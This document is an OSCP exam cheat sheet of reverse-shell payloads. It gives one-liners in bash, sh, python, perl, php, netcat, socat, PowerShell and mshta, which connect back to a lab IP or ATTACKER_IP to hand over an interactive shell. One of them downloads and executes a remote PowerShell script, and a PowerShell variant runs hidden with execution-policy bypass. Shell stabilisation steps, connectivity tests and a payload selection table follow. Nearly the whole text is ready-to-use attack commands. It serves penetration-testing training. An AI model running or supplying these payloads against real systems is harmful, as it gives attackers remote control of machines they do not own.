# 🐚 OSCP Reverse Shell Cheat Sheet (Exam-Ready)

## 1. Start Your Listener (Attacker Machine)

### Netcat (Classic)
```bash
nc -lvnp 4444
```

### OpenBSD Netcat
```bash
nc -lvnp 4444
```

### rlwrap (Improves Shell Quality)
```bash
rlwrap nc -lvnp 4444
```

---

## 2. Linux Reverse Shells

### Bash
```bash
bin/bash -i >& /dev/tcp/192.168.45.151/443 0>&1
```

### Alternative Bash
```bash
0<&196;exec 196<>/dev/tcp/192.168.45.151/443; bash <&196 >&196 2>&196
```

### sh Reverse Shell (BusyBox Compatible)
```bash
sh -i >& /dev/tcp/192.168.45.151/443 0>&1
```

### Python3
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.151",80));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### Python2
```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Perl
```bash
perl -e 'use Socket;$i="192.168.45.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```bash
php -r '$sock=fsockopen("192.168.45.151",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP Alternative
```bash
php -r '$s=fsockopen("192.168.45.151",443);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

### Netcat (With -E)
```bash
nc -e /bin/bash ATTACKER_IP 4444
```

### Netcat Without -E
```bash
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### Socat
```bash
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash
```

---

## 3. Windows Reverse Shells

### Full PowerShell TCP Reverse Shell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.101',4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

### Short PowerShell Reverse Shell
```powershell
powershell -c "$c=New-Object Net.Sockets.TCPClient('192.168.45.151',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($r=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write([Text.Encoding]::ASCII.GetBytes($sb2),0,$sb2.Length)}"
```

### Windows Netcat Reverse Shell
```cmd
nc.exe ATTACKER_IP 4444 -e cmd.exe
```

### MSHTA Reverse Shell
```cmd
mshta vbscript:CreateObject("Wscript.Shell").Run("powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')",0)(window.close)
```

---

## 4. Shell Upgrade / Stabilization

### Spawn a TTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### If Python Not Available
```bash
script /bin/bash
```

### Fix Line Behavior
Press:
```
CTRL + Z
```

Then:
```bash
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=/bin/bash
```

### Use rlwrap for History & Arrow Keys
```bash
rlwrap nc -lvnp 4444
```

---

## 5. Troubleshooting Reverse Shells

### Test Outbound Connectivity
```bash
curl ATTACKER_IP:4444
wget ATTACKER_IP:4444
ping ATTACKER_IP
```

### Try Different Ports
- 53
- 80
- 443
- 8000
- 8080

### Use HTTPS-Like Traffic
```bash
socat TCP:ATTACKER_IP:443 EXEC:/bin/bash
```

### Webshell Execution Fix
```bash
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

## 6. Payload Selection Quick Table

| Environment / Constraint | Best Reverse Shell |
|--------------------------|--------------------|
| Linux + Python available | Python reverse shell |
| BusyBox / Embedded       | sh or mkfifo nc shell |
| Windows + PowerShell     | PowerShell TCP shell |
| Windows w/ nc.exe        | `nc -e cmd.exe` |
| No nc -e flag            | mkfifo reverse shell |
| Restricted webshell      | PHP one-liner |
| Need interactive shell   | socat |
